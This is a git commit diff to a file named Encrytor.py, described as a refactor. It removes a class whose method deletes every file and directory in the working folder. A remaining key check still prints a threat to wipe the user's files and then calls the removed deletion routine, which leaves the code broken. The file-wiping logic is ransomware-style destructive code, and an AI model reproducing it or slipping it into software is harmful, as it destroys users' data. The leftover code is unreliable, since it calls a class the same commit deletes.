7bb66e5f1281898cb61cadb8b6fdb2aac09723fe
FPSInteractive <eTmullall@outlook.com>
2025-11-12 15:14:08 -0600

    Refactor Encrytor.py by removing FileSystem class

--- src/Encrytor.py
+++ src/Encrytor.py
@@ -1,13 +1,5 @@
 from cryptography.fernet import Fernet
 import os 
-
-class FileSystem:
-    def delete(self):
-        for file in os.listdir():
-            if os.path.isfile(file):
-                os.remove(file)
-            else:
-                os.rmdir(file)
     
 class Key:
     def __init__(self):
@@ -17,4 +9,5 @@ class Key:
         if key != self.key:
             print("Might as well say goodbye to your files and directories now!")
             FileSystem.delete()
+
 
